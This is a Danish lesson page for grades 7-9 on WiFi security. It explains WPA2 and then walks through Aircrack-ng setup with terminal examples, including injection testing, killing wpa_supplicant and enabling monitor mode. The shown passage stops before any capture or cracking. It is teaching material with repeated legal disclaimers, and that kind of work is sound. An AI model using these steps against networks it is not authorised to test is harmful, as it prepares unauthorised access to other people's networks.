@@ -1,0 +1,1163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Hacking - Sådan hacker du et Access Point</title>
+    
+    <!-- Link to google font--> 
+    <link rel="preconnect" href="https://fonts.googleapis.com"> 
+    <!-- link to style.css --> 
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/terminal.css">
+        <link rel="stylesheet" type="text/css" href="css/mediaA4.css">
+
+
+</head>
+<body onload="runOnLoad(); showChapterHeaders();">
+  <div class="content-wrapper">
+
+    <header>
+      <div class="nav a4-noprint">
+        <a href="index.html" title="Home directory">
+          /home
+        </a>
+        <a target="_blank" href="mailto:muninn@WubbaLubbaDubDub.com" title="Mail">
+          /contact
+        </a>  
+      </div>
+      
+      <a class="svglink" target="_blank" href="https://facebook.com" title="Facebook">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M8.258,4.458c0-0.144,0.02-0.455,0.06-0.931c0.043-0.477,0.223-0.976,0.546-1.5c0.32-0.522,0.839-0.991,1.561-1.406 C11.144,0.208,12.183,0,13.539,0h3.82v4.163h-2.797c-0.277,0-0.535,0.104-0.768,0.309c-0.231,0.205-0.35,0.4-0.35,0.581v2.59h3.914 c-0.041,0.507-0.086,1-0.138,1.476l-0.155,1.258c-0.062,0.425-0.125,0.819-0.187,1.182h-3.462v11.542H8.258V11.558H5.742V7.643 h2.516V4.458z"/>
+          </svg>
+      </a>
+        
+      <a class="svglink" target="_blank" href="https://Github.com" title="Github">
+        <svg viewBox="71 71 370 370">
+          <path d="M256 70.7c-102.6 0-185.9 83.2-185.9 185.9 0 82.1 53.3 151.8 127.1 176.4 9.3 1.7 12.3-4 12.3-8.9V389.4c-51.7 11.3-62.5-21.9-62.5-21.9 -8.4-21.5-20.6-27.2-20.6-27.2 -16.9-11.5 1.3-11.3 1.3-11.3 18.7 1.3 28.5 19.2 28.5 19.2 16.6 28.4 43.5 20.2 54.1 15.4 1.7-12 6.5-20.2 11.8-24.9 -41.3-4.7-84.7-20.6-84.7-91.9 0-20.3 7.3-36.9 19.2-49.9 -1.9-4.7-8.3-23.6 1.8-49.2 0 0 15.6-5 51.1 19.1 14.8-4.1 30.7-6.2 46.5-6.3 15.8 0.1 31.7 2.1 46.6 6.3 35.5-24 51.1-19.1 51.1-19.1 10.1 25.6 3.8 44.5 1.8 49.2 11.9 13 19.1 29.6 19.1 49.9 0 71.4-43.5 87.1-84.9 91.7 6.7 5.8 12.8 17.1 12.8 34.4 0 24.9 0 44.9 0 51 0 4.9 3 10.7 12.4 8.9 73.8-24.6 127-94.3 127-176.4C441.9 153.9 358.6 70.7 256 70.7z"/>
+        </svg>
+      </a>
+      
+      <a class="svglink" target="_blank" href="https://linkedin.com" title="LinkedIn">
+        <svg viewBox="71 71 370 370">
+          <path d="M186.4 142.4c0 19-15.3 34.5-34.2 34.5 -18.9 0-34.2-15.4-34.2-34.5 0-19 15.3-34.5 34.2-34.5C171.1 107.9 186.4 123.4 186.4 142.4zM181.4 201.3h-57.8V388.1h57.8V201.3zM273.8 201.3h-55.4V388.1h55.4c0 0 0-69.3 0-98 0-26.3 12.1-41.9 35.2-41.9 21.3 0 31.5 15 31.5 41.9 0 26.9 0 98 0 98h57.5c0 0 0-68.2 0-118.3 0-50-28.3-74.2-68-74.2 -39.6 0-56.3 30.9-56.3 30.9v-25.2H273.8z"/>
+        </svg>
+      </a>
+    </header>
+  
+  
+    <div class="main-content-container">
+      <div class="intro-header">
+        <div id="__chapter" class="__chapter_menu_container">
+        </div>
+      
+          
+        <div class="contact"> 
+          <p>Forfatter: A. H. Johansen</p>
+          
+          <a class="svglink" target="_blank" href="mailto:muninn@WubbaLubbaDubDub.com" title="Mail">
+            <svg viewBox="71 71 370 370">
+              <path d="M101.3 141.6v228.9h0.3 308.4 0.8V141.6H101.3zM375.7 167.8l-119.7 91.5 -119.6-91.5H375.7zM127.6 194.1l64.1 49.1 -64.1 64.1V194.1zM127.8 344.2l84.9-84.9 43.2 33.1 43-32.9 84.7 84.7L127.8 344.2 127.8 344.2zM384.4 307.8l-64.4-64.4 64.4-49.3V307.8z"/>
+            </svg>
+          </a>
+        </div>
+        <p class="updated">11.06.2026</p>
+
+      </div>
+    </div>
+  </div>
+
+    <!-- ######################## MENU CONTENT ###################################-->
+    <!-- ######################## MENU CONTENT ###################################-->
+    <!-- ######################## MENU CONTENT ###################################-->
+  
+    <div class="main-content-menu">
+      <div class="content-wrapper">
+
+        <div class="main-content-right-wrapper a4-noprint">
+            <div id="nav" class="main-content-right">
+            <ul class="top">
+                <li class="menu_side">Indhold</li>
+                <li class="menu_side">Resourcer</li>
+                <li class="menu_side">Til læreren</li>
+                <li class="menu_side">Fælles Mål</li>
+            </ul>
+
+            <div class="menu_text main-menu-content-text" style="display: flex; flex-direction: column" alt="Kapiteler">
+                <div id="chapter-headers-container">
+                <!-- gets content from script: showChapterHeaders() which is loaded onload of the body-->
+
+                </div>
+            </div>      
+
+
+            <!-- #### MENU RESOURCER -->
+            <div id="download" class="menu_text main-menu-content-text">
+                <h2>Downloads</h2>
+                <div class="download-wrapper">
+              
+                <div class="download-chapter-container">
+                  <h4 class="menu-chapter-number-style" style="font-size:0.9em;">Kapitel 4</h4>
+                  <a class="file" href="uploads/passwdlist.txt" download>
+                    <button class="download-file">
+                      <img src="images/txt.svg" style="width:22px;">
+                      <span class="file-name">passwdlist.txt</span>
+                      <i class="fa fa-download"></i>
+                      <p>Til læreren - <span class="put-file-name">error - can't get file name</span></p>
+                    </button>
+                  </a>
+                </div>
+
+
+
+              </div>
+            </div>
+                
+
+            <!-- #### TIL LÆREREN ####-->
+            <div id="til-læreren" class="menu_text main-menu-content-text">
+              <h2>Til læreren</h2>
+              <h4 style="margin-bottom:5px;">Om forløbet</h4>
+              <p>I dette forløb arbejder vi med trådløse netværk og WiFi-sikkerhed. Vi undersøger, hvordan trådløse netværk er opbygget, hvordan kryptering som WPA2 og WPA3 bruges til at beskytte data, og hvorfor sikre adgangskoder er afgørende for at forhindre uautoriseret adgang.</p>              
+              <p>Forløbet tager udgangspunkt i, hvordan sikkerhed kan analyseres i kontrollerede og lovlige testmiljøer, så vi kan forstå både styrker og svagheder ved trådløs netværksbeskyttelse. Eventuelle tekniske eksempler vises udelukkende som demonstration og analyse og må ikke anvendes på rigtige netværk.</p>
+              <p>Det er vigtigt at understrege, at forsøg på at få adgang til eller manipulere med trådløse netværk uden udtrykkelig tilladelse fra ejeren er ulovligt og kan have alvorlige konsekvenser. Derfor har forløbet et tydeligt fokus på etik, lovgivning og ansvarlig brug af teknologisk viden.</p>
+              <p>Målet med forløbet er ikke at lære at angribe netværk, men at opnå forståelse for, hvordan trådløs sikkerhed fungerer, og hvordan man bedst beskytter sine egne og andres netværk. Viden om sårbarheder bruges som et redskab til at styrke sikkerhed – ikke til at udnytte den.</p>
+              <h4>Lærervejledning til forløbet</h4>
+              <div>
+                <button class="collapsible menu-chapter-number-style"><span style="font-weight: 800;">kapitel 1 <span style="color:rgb(105, 105, 105)">- Til læreren</span></span></button>
+                <div class="collapsible-content">
+                    <h3>Teknologier</h3>
+                    <section>
+                      <h4>Hardware</h4>
+                      <ul>
+                        <li>En computer der kan kører Python3 - Udvikleren af Flask anbefaler den nyeste version af Python. Flask supporter Python 3.9 og frem.</li>
+                      </ul>
+
+                      <h4>Software</h4>
+                      <ul>
+                        <li>Python3 <a href="https://www.python.org/downloads/" target="_blank">Python3</a></li>
+                        <li>Flask <a href="https://flask.palletsprojects.com/en/stable/installation/#python-version", target="_blank">Flask module</a></li>
+                      </ul>
+                    </section>
+                </div>
+              </div>  
+              
+
+            </div>
+
+            <!-- #### FÆLLES MÅL #### -->
+            <div id="fælles-mål" class="menu_text main-menu-content-text" ><h2>Fælles Mål</h2>
+              <div>
+                <button class="collapsible menu-chapter-number-style"><span style="font-weight: 800;">kapitel 1 <span style="color:rgb(105, 105, 105)">- Fælles Mål</span></span></button>
+                <div class="collapsible-content">
+                  <h2>Teknologiforståelse</h2>
+                  <div class="faelles-maal-container">
+                    <h3>Digital design og designprocesser</h3>
+                    <h4 class="faelles-mael-niveau">Konstruktion</h4>
+
+                    <div class="vidensmaal">
+                      <p>Eleven kan med digitale teknologier konstruere digitale artefakter, der manifesterer en ide i digitalt materiale</p>
+                      <p>Eleven har viden om konstruktion med digitale teknologier og om formgivning i digitale materialer ift. en ide</p>
+                    </div>
+                  </div>
+
+                  <div class="faelles-maal-container">
+                    <h3>Teknologisk handleevne</h3>
+                    <h4 class="faelles-mael-niveau">Programmering</h4>
+                    <div class="vidensmaal">
+                      <p>Eleven kan læse og forstå programmer skrevet i et tekstbaseret programmeringssprog samt anvende et sådant til systematisk modifikation og konstruktion af programmer ud fra en problemspecifikation</p>
+                      <p>Eleven har viden om metoder til at analysere og forudsige programmers opførsel samt teknikker til systematisk og trinvis udvikling af programmer</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+
+            </div>
+            </div>
+        </div>
+      </div>
+    </div>
+
+<!-- ########################MAIN CONTENT###################################-->
+<!-- ########################MAIN CONTENT###################################-->
+<!-- ########################MAIN CONTENT###################################-->
+<!-- ########################MAIN CONTENT###################################-->
+<div class="content-wrapper">
+
+  <article class="print-a4">
+    <section class="content borderline">
+      <h1 id="header">WiFi og sikkerhed</h1 >
+        <p>I dette forløb arbejder vi med trådløse netværk og WiFi-sikkerhed. Vi undersøger, hvordan moderne WiFi-beskyttelse som WPA2 og WPA3 er opbygget, og hvorfor adgangskoder og kryptering er afgørende for at beskytte data i et netværk.</p>              
+    
+      <div class="hBvBcu">
+        <div data-testid="lesson_duration" class="sc-1hav87h-4 NXQeT"><svg aria-hidden="true" size="20" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" class="sc-eldPxv dbQSpJ"><title>CLOCK</title><path d="M24.5 24.5H35v3H21.5V11h3v13.5zm18-.5c0-10.217-8.282-18.5-18.5-18.5S5.5 13.783 5.5 24 13.782 42.5 24 42.5 42.5 34.217 42.5 24zm3 0c0 11.874-9.626 21.5-21.5 21.5S2.5 35.874 2.5 24 12.126 2.5 24 2.5 45.5 12.126 45.5 24z"></path></svg>
+          ca. 2 lek.</div> 
+        <div data-testid="lesson_level" class="sc-1hav87h-4 NXQeT"><svg aria-hidden="true" size="20" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" class="sc-eldPxv dbQSpJ"><title>BRICK</title><path d="M15.575 10.229l-4.22 1.738 12.481 5.14 12.482-5.14-4.22-1.738v.359c0 2.581-3.732 3.914-8.262 3.914s-8.261-1.333-8.261-3.914v-.36zm16.522-3.96v.715l9.66 3.979v27.605l-17.92 7.38-17.921-7.38V10.963l9.659-3.979v-.743c0-2.582 3.73-3.915 8.261-3.915 4.53 0 8.262 1.333 8.262 3.915v.028zm-3 3.122c-1.433.507-3.27.765-5.26.765-1.992 0-3.829-.258-5.262-.766v.992c.186.157.525.336.985.5 1.087.388 2.622.62 4.276.62 1.655 0 3.19-.232 4.276-.62.46-.164.799-.343.985-.5V9.39zm-3.76 32.694l13.42-5.526V14.207l-13.42 5.526v22.352zm-3 0V19.733L8.915 14.207V36.56l13.42 5.525zm5.776-36.139c-1.087-.388-2.622-.62-4.277-.62-1.655 0-3.19.232-4.276.62a4.732 4.732 0 0 0-.674.295c.18.098.406.2.674.295 1.086.388 2.621.62 4.276.62 1.655 0 3.19-.232 4.277-.62.267-.096.494-.197.674-.295-.18-.099-.407-.2-.674-.295z"></path></svg>
+          Øvet</div>
+        <div data-testid="lesson_grade" class="sc-1hav87h-4 NXQeT"><svg aria-hidden="true" size="20" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" class="sc-eldPxv dbQSpJ"><title>GRADUATE</title><path d="M9.917 22.292l-6.715-4.666c-.977-.621-.937-2.107.135-2.64l20.48-10.548.687.354 19.742 10.17c1.122.51 1.178 2.033.236 2.63l-1.805 1.255v11.278h-3V20.93l-1.96 1.362v14.332l-.3.4c-.571.762-1.675 1.821-3.359 2.857-2.75 1.693-6.16 2.703-10.241 2.703-4.082 0-7.491-1.01-10.241-2.703-1.684-1.036-2.788-2.095-3.36-2.857l-.3-.4V22.292zm3 2.085v11.186c.073.076.158.161.255.255.531.51 1.188 1.025 1.976 1.51 2.288 1.407 5.156 2.257 8.669 2.257 3.513 0 6.381-.85 8.669-2.258.788-.484 1.445-1 1.976-1.51.097-.093.183-.178.256-.254V24.378l-10.9 7.574-.856-.595-10.045-6.98zm10.9 3.921L40.75 16.534 23.817 7.812 6.885 16.534l16.932 11.764zM42.94 17.661a1.42 1.42 0 0 1-.13-.066l.13.066zm-.118-2.565l-.102.07c.033-.024.067-.048.102-.07z"></path></svg>
+          7.-9. klasse</div>
+      </div>
+    </section>   
+    
+    <section class="content">
+      <div class="image-wrapper">
+        <img src="images/header.png" alt="Rooter" width=100%>
+        <span class="copyright-image">© Foto: Unsplash</span> 
+      </div>
+      <h2>WiFi-sikkerhed og trådløse netværk</h2>
+      <div class="flex-container">
+        <div>
+          <p>Forløbet tager udgangspunkt i analyse af, hvordan sikkerhed kan brydes i kontrollerede og lovlige testmiljøer, så vi kan forstå, hvordan man bedst beskytter sig mod angreb. Målet er at give en praktisk forståelse af, hvordan trådløse netværk fungerer, og hvordan sikkerhedsmekanismer beskytter mod uautoriseret adgang.</p> 
+        </div>
+        <div class="main-box">
+          <div class="details">
+            <h1>Link til forløb</h1>
+            <p>Scan QR-koden for at se forløbet og tage dine hackingevner til det næste niveau.</p>
+          </div>
+          <img class="qr-img" src="images/image-qr-code.png" alt="QR code image">
+        </div>
+      </div> 
+    </section>
+
+    <section class="disclaimer">
+      <p><strong>Disclaimer:</strong> Dette materiale er udelukkende udarbejdet til undervisningsformål. Forsøg på at få adgang til eller angribe netværk, som du ikke selv ejer eller har udtrykkelig tilladelse til at teste, er ulovligt. Eventuelle eksempler og demonstrationer må derfor kun anvendes i kontrollerede og lovlige testmiljøer.</p>
+    </section>
+  </article>
+
+  <section class="content">
+    <div id="Introduktion" class="__chapter_menu_container">
+      <h2 class="menu-chapter-title chapter-title">Introduktion</h2>      
+    </div>
+    <div id="Introduktion-basis" class="__chapter_menu_subheader_1">
+      <h3>Basis - En intro til WPA</h3>
+    </div>
+
+    <div class="chapter-text">
+      <p>Vi bruger WiFi hver eneste dag – derhjemme, i skolen og i det offentlige rum. Vores telefoner, computere og spil er konstant forbundet til trådløse netværk, som sender data frem og tilbage, ofte uden at vi tænker over, hvordan forbindelsen egentlig er beskyttet.</p>
+
+      <p>I dette forløb arbejder vi med WiFi-sikkerhed og trådløse netværk. Vi undersøger, hvordan moderne WiFi-beskyttelse som WPA2 fungerer, og hvorfor adgangskoder og kryptering spiller en afgørende rolle for at beskytte data mod uautoriseret adgang.</p>
+
+
+      <div class="forklaring">
+        <p>Ordliste:</p>
+        <ul>
+          <li>SSID → Navnet på et trådløst netværk – det navn du ser, når du leder efter WiFi på din enhed.</li>
+          <li>ESSID → Et netværksnavn, som kan dække flere access points. Bruges ofte i større netværk, fx på en skole eller i en virksomhed. I analyseværktøjer henviser det typisk til det netværk, man undersøger.</li>
+          <li>BSSID → Den fysiske (unikke) hardwareadresse på et access point. Kan sammenlignes med et serienummer for netværksudstyret.</li>
+          <li>WPA2-PSK → En type WiFi-sikkerhed, hvor alle brugere logger på netværket med det samme kodeord. Bruges typisk i private hjem.</li>
+          <li>WPA2-EAP → En type WiFi-sikkerhed, hvor hver bruger logger ind med sit eget brugernavn og kodeord. Bruges ofte på skoler og arbejdspladser.</li>
+          <li>RADIUS → En server, der bruges til at godkende brugere, fx når man logger på et WiFi-netværk med brugernavn og kodeord. Bruges ikke kun til WiFi, men også til andre typer login.</li>
+        </ul>
+      </div>
+      <p>Kernen af WPA(2) (Wi-Fi Protected Access) sikkerhedsprotokollen for trådløs internet er "the 4 way handshake" - som groft oversat betyder "det 4-vejs håndtrykket".</p>
+      <p>De fleste WiFi netværk i private hjem bruge WPA(2), hvor WPE (Wired Equivalent Privacy) tidligere blev brugt. Ved 4-vejs håndtrykket kan en klient og en router erkende overfor hinanden, at de kender "nøglen" uden egentlig at opgive en decideret nøgle.</p>
+      <p>Nøglen til WPA bliver udledet af både ESSID (navnet på netværket) og kodeordet til netværket. Dette gør det svære at gennemføre et standard "dictionary attack" - for hver password, vil nøglen stadig varierer for hver access point.</p>
+      
+      <p>For at opfange den nødvendige data (4 way handshake), skal vi bruge en samling programmer, som samlet kaldes for <span class="code-ex">Aircrack-ng Suit</span>, til at opfange, analysere og angribe et netværk. Man skal dog bruge et WiFi NIC (Network Interface Controller) der kan sættes i "moitor mode" - normalt vil ens netværk interface controller være i det der hedder "managed mode".</p>
+      <p class="info">Monitor mode er en tilstand, hvor et trådløst netværkskort kan opfange WiFi-trafik i området uden at være forbundet til et netværk. Det bruges til at analysere trådløs kommunikation i kontrollerede og lovlige testmiljøer.</p>
+    </div>  
+
+  </section>
+
+
+
+
+
+
+  <section class="content">
+    <div id="Opsætning" class="__chapter_menu_container">
+      <h2 class="menu-chapter-title chapter-title">Opsætning</h2>      
+    </div>
+    <div id="Opsætning_kali" class="__chapter_menu_subheader_1">
+      <h3>Kali Linux – vores testmiljø</h3>
+    </div>
+    <p>I dette forløb bruger vi Kali Linux som et kontrolleret testmiljø til analyse af netværkssikkerhed. Kali Linux er en Linux-distribution, der indeholder værktøjer til at undersøge og teste IT-sikkerhed.</p>
+    <img class="center-image" src="images/Kali-screenshot.png" alt="Kali-screenshot" width=100%>
+    <p>Vi bruger systemet til at forstå, hvordan trådløse netværk fungerer, og hvordan sikkerhed kan analyseres i et lukket og lovligt miljø.</p>
+
+    <section class="disclaimer">
+      <p><strong></strong>Installation og konfiguration af Kali Linux ligger uden for dette forløbs omfang. Alle aktiviteter i forløbet forudsætter et allerede etableret og kontrolleret undervisningsmiljø, hvor fokus er analyse og forståelse af netværkssikkerhed.</p>
+    </section>
+    
+    
+    <div id="Opsætning_usbadapter" class="__chapter_menu_subheader_1">
+      <h3>WiFI og USB-adapter</h3>
+    </div>
+    <p>De fleste computere har allerede et indbygget WiFi-kort. Det fungerer fint til almindelig brug som at gå på nettet og streame video.</p>
+    <p>I dette forløb bruger vi dog en ekstern WiFi USB-adapter, fordi den giver adgang til funktioner, som det indbyggede netværkskort ofte ikke understøtter.</p>
+    <p>En ekstern adapter kan blandt andet:</p>
+    <ul>
+      <li>arbejde mere fleksibelt med trådløse signaler</li>
+      <li>bruges til at analysere netværkstrafik mere detaljeret</li>
+      <li>skifte mellem forskellige netværkstilstande, som er nødvendige i kontrollerede testmiljøer</li>
+    </ul>
+
+
+
+
+    <div id="Opsætning_interface" class="__chapter_menu_subheader_1">
+      <h3>WiFi og interface-navne </h3>
+    </div>
+
+    <p>Når en computer har mere end ét trådløst netværkskort (fx det indbyggede WiFi og en USB-adapter), får de forskellige <span class="info">interface-navne</span>. For at finde ud af hvilket interface der tilhører USB-adapteren, kan man gøre følgende:</p>
+    
+
+    <h4>Trin 1 – Start computeren uden USB-adapteren</h4>
+    <ul>
+      <li>Tænd computeren <b>uden</b> at WiFi USB-adapteren er sat i</li>
+      <li>Åbn en terminal</li>
+      <li>Tjek hvilke netværksinterfaces der allerede findes</li>
+    </ul>
+        
+    <p>På Linux kan vi benytte <span class="code-ex">iwconfig</span> eller <span class="code-ex">airmon-ng</span> til at se status og navn for tilgængelige trådløse netværk interfaces.</p>
+    <div class="terminal linux">
+      <div class="terminal-header-linux">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+        <span class="terminal-title"></span>
+        <div class="title">
+          <span>ssh</span>
+          <button class="copy-btn">Copy</button>
+        </div>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">iwconfig</span></span>
+      </code></pre>
+    </div>  
+
+    <div class="terminal linux">
+      <div class="terminal-header-linux">
+        <span class="terminal-title-output">Output</span>
+        <span class="title">ssh</span>
+    </div>
+    <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">iwconfig</span></span>
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan0     IEEE 802.11  ESSID:"NoNameRouter"
+          Mode:Managed  Frequency:5.26 GHz  Access Point: 7C:57:3C:▉:▉:▉
+          Bit Rate=54 Mb/s   Tx-Power=15 dBm
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:off
+          Link Quality=45/70  Signal level=-65 dBm
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:3  Invalid misc:15   Missed beacon:0
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+    </div>
+    <p>Notér navnet på det trådløse interface, der vises (fx wlan0) - det er computerens indbyggede wifi kort.</p>
+
+    <h4>Trin 2 – Sæt WiFi USB-adapteren i</h4>
+    <ul>
+      <li>Sæt WiFi USB-adapteren i computeren</li>
+      <li>Vent et øjeblik</li>
+      <li>Kør kommandoen igen:</li>
+    </ul>
+
+    <div class="terminal linux">
+      <div class="terminal-header-linux">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+        <span class="terminal-title"></span>
+        <div class="title">
+          <span>ssh</span>
+          <button class="copy-btn">Copy</button>
+        </div>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">iwconfig</span></span>
+      </code></pre>
+    </div>  
+
+    <div class="terminal linux">
+      <div class="terminal-header-linux">
+        <span class="terminal-title-output">Output</span>
+        <span class="title">ssh</span>
+    </div>
+    <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">iwconfig</span></span>
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan0     IEEE 802.11  ESSID:"NoNameRouter"
+          Mode:Managed  Frequency:5.26 GHz  Access Point: 7C:57:3C:▉:▉:▉
+          Bit Rate=54 Mb/s   Tx-Power=15 dBm
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:off
+          Link Quality=45/70  Signal level=-65 dBm
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:3  Invalid misc:15   Missed beacon:0
+
+wlan1     IEEE 802.11  ESSID:off/any
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
+          Retry short  long limit:2   RTS thr:off   Fragment thr:off
+          Power Management:off
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+    </div>
+
+    <p>Ud fra outputtet fra <span class="code-ex">iwconfig</span> kan vi se, at jeg har to wireless interface; <i>wlan0</i> og <i>wlan1</i></p>
+
+
+    <h4>Trin 3 – Sammenlign resultatet</h4>
+    <p>Det nye interface, der dukker op efter USB-adapteren er sat i, er USB-adapteren.</p>
+    <p>Det vil typisk hedde <span class="info">wlan1</span>, hvis den indbyggede allerede var <span class="info">wlan0</span>.</p>
+
+
+  </section>
+
+<!-- ######################## NEW CHAPTER ###################################-->
+<!-- ######################## NEW CHAPTER ###################################-->
+<!-- ######################## NEW CHAPTER ###################################-->
+  <section class="content new-chapter">
+    <div id="aireplay" class="__chapter_menu_container">
+      <h2 class="menu-chapter-title chapter-title">Scan for WiFi Access Points</h2>
+    </div>
+    <section>
+      <div id="aireplay_ap" class="__chapter_menu_subheader_1">
+        <h3>Access Points</h3>
+      </div>
+      <p>Vi skal først scanne området for Access Points.</p>
+      <p class="vigtigt">Vigtigt: Vi må kun angribe egne Access Point! Dette er meget kritisk!</p>
+    </section> 
+
+
+    <section>
+      <p>Først tester vi, om vi kan sætte vores USB-adapter kan "inject" og whilke Access Points adapteren kan se.</p>
+
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="dot red"></span>
+          <span class="dot yellow"></span>
+          <span class="dot green"></span>
+          <span class="terminal-title"></span>
+          <div class="title">
+            <span>ssh</span>
+            <button class="copy-btn">Copy</button>
+          </div>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo aireplay-ng --test wlan1</span></span>
+        </code></pre>
+      </div>  
+
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="terminal-title-output">Output</span>
+          <span class="title">ssh</span>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo aireplay-ng --test wlan1</span></span>
+[sudo] password for kali:
+ioctl(SIOCSIWMODE) failed: Device or resource busy
+10:25:37  Trying broadcast probe requests...
+10:25:37  Injection is working!
+10:25:38  Found 11 APs
+
+10:25:38  Trying directed probe requests...
+10:25:38  7C:57:3C:##:##:## - channel: 1 - 'redacted'
+10:25:39  Ping (min/avg/max): 1.501ms/15.917ms/28.702ms Power: -44.60
+10:25:39  30/30: 100%
+
+10:25:39  7C:57:3C:##:##:## - channel: 1 - 'redacted'
+10:25:39  Ping (min/avg/max): 7.769ms/15.056ms/25.655ms Power: -43.40
+10:25:39  30/30: 100%
+
+10:25:39  7C:57:3C:##:##:## - channel: 1 - 'redacted'
+10:25:40  Ping (min/avg/max): 7.143ms/15.711ms/24.111ms Power: -43.53
+10:25:40  30/30: 100%
+
+10:25:40  7C:57:3C:##:##:## - channel: 1 - 'redacted'
+10:25:40  Ping (min/avg/max): 2.602ms/14.504ms/23.930ms Power: -43.59
+10:25:40  29/30:  96%
+
+10:25:40  7C:57:3C:##:##:## - channel: 1 - 'redacted'
+10:25:41  Ping (min/avg/max): 2.402ms/6.323ms/16.843ms Power: -43.41
+10:25:41  29/30:  96%
+
+10:25:41  7C:57:3C:##:##:## - channel: 1 - 'redacted'
+10:25:41  Ping (min/avg/max): 5.131ms/14.458ms/29.381ms Power: -43.48
+10:25:41  29/30:  96%
+
+10:25:41  7C:57:3C:29:89:41 - channel: 1 - 'redacted'
+^C/13:  61%
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+      </div>
+
+
+      <p>Vi kan se vores adapter virker og kan se optil flere Access Points.</p>
+      <p>Før vi kan udføre angrebet, skal vi  først deaktiverer de værktøjer der styrer kontrollerer vores netværkskort (eks. wpa_supplicant):</p>
+      <p>Brug <span class=code-ex>airmon-ng check kill</span> kommandoen til at "dræbe" tjenester der evt. kan forsøge at sætte vores netværks interface i "managed mode" igen.</p>
+
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="dot red"></span>
+          <span class="dot yellow"></span>
+          <span class="dot green"></span>
+          <span class="terminal-title"></span>
+          <div class="title">
+            <span>ssh</span>
+            <button class="copy-btn">Copy</button>
+          </div>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airmon-ng check kill</span></span>
+        </code></pre>
+      </div>  
+
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="terminal-title-output">Output</span>
+          <span class="title">ssh</span>
+        </div>
+    <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airmon-ng check kill</span></span>
+[sudo] password for kali:
+
+Killing these processes:
+
+    PID Name
+    739 wpa_supplicant
+
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+      </div>
+
+      <p>Sæt efterfølgende vores netværks interface i "monitor mode"</p>
+
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="dot red"></span>
+          <span class="dot yellow"></span>
+          <span class="dot green"></span>
+          <span class="terminal-title"></span>
+          <div class="title">
+            <span>ssh</span>
+            <button class="copy-btn">Copy</button>
+          </div>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airmon-ng start wlan1</span></span>
+        </code></pre>
+      </div>  
+
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="terminal-title-output">Output</span>
+          <span class="title">ssh</span>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airmon-ng start wlan1</span></span>
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           iwlwifi         Intel Corporation Centrino Ultimate-N 6300 (rev 35)
+phy1    wlan1           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211 monitor mode vif enabled for [phy1]wlan1 on [phy1]wlan1mon)
+                (mac80211 station mode vif disabled for [phy1]wlan1)
+
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+      </div>
+
+
+      
+
+
+      <p>Vi kan nu benytte os af <span class="code-ex">iwconfig</span> til at se vores interface-navne igen:</p>
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="dot red"></span>
+          <span class="dot yellow"></span>
+          <span class="dot green"></span>
+          <span class="terminal-title"></span>
+          <div class="title">
+            <span>ssh</span>
+            <button class="copy-btn">Copy</button>
+          </div>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">iwconfig</span></span>
+        </code></pre>
+      </div>  
+
+        <div class="terminal linux">
+          <div class="terminal-header-linux">
+            <span class="terminal-title-output">Output</span>
+            <span class="title">ssh</span>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">iwconfig</span></span>
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan0     IEEE 802.11  ESSID:off/any
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=15 dBm
+          Retry short limit:7   RTS thr:off   Fragment thr:off
